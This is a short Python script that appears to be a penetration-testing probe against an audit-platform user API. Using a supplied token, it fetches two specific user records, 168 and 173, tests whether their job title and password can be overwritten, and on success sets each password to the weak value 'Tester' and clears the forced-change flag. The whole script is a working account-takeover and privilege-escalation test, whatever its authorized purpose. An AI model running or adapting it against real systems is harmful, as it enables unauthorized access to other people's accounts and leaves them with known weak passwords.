import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
# role-1 targets other than id 1
for uid in [168, 173]:
    c,b=req('GET',f'/api/v1/users/{uid}')
    u=json.loads(b)['users'][0]
    print(f"target {uid}: {u['email']} role={u['role_id']}")
    # harmless field first: does edit permission work at all on this target?
    c2,b2=req('PUT',f'/api/v1/users/{uid}',{"user":{"job_title":"zx-probe"}})
    print(f"   job_title write -> {c2} {b2[:150].replace(chr(10),' ')}")
    c3,b3=req('PUT',f'/api/v1/users/{uid}',{"user":{"password":"Zx9!r1probe"}})
    print(f"   password write  -> {c3} {b3[:150].replace(chr(10),' ')}")
    if c3=='200':
        print("   !! password accepted on role-1 target -> restoring")
        req('PUT',f'/api/v1/users/{uid}',{"user":{"password":"Tester"}})
        req('PUT',f'/api/v1/users/{uid}',{"user":{"requires_password_change":False}})
    print()
